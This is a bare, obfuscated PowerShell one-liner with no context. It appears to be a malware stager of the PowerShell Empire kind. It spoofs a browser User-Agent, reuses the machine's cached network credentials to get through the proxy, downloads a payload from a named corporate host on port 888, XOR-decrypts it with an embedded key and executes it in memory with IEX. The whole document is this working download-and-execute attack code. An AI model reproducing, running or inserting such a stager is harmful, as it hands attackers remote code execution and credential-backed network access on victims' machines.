
[SySteM.Net.SeRvicePOiNTMaNAger]::ExpEcT100CoNtiNuE = 0;$wC=NEw-ObjecT SYstem.Net.WebCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.AdD('User-Agent',$u);$WC.PRoxY = [SysTem.Net.WeBREqUesT]::DEfAULTWeBPRoXy;$wc.PRoxy.CReDentiALs = [SYsTeM.Net.CreDENTialCAcHE]::DEFAulTNEtWORKCreDEnTIaLs;$K='0c88028bf3aa6a6a143ed846f2be1ea4';$I=0;[chAr[]]$B=([char[]]($Wc.DOWNLoaDSTrinG("http://chgvaswks045.efgz.efg.corp:888/index.asp")))|%{$_-BXor$K[$i++%$k.Length]};IEX ($B-JoIn'')

